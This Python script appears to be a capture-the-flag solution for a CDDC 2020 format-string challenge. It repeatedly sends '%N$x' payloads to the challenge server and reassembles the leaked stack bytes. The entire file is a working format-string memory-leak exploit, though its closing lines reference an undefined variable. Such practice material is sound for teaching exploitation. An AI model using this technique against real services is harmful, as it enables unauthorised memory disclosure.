#!/usr/bin/env python3
#!/usr/bin/env python3
import socket
import telnetlib

def attempt(payload):
    s = socket.socket()
    s.connect(('fsb.chall.cddc2020.nshc.sg', 30303))
    t = telnetlib.Telnet()
    t.sock = s

    t.read_until(b'How many bugs did you find?').decode()
    t.write(payload.encode() + b'\n')

    return t.read_until(b'\n').decode()

#bugs = t.read_until(b'\n').decode()
#print(bugs)

#found = bugs.count("🐛")
#t.write(str(found).encode() + b'\n')

received = b''

count = 1
while True:
    result = attempt("%1$x".replace('1', str(count))).strip()
    print(result)
    
    received += bytes.fromhex(result)[::-1]
    print("Progress:", count, received)

    count += 1




print()
print(t.read_until(b'\n'))
print(t.read_until(b'\n'))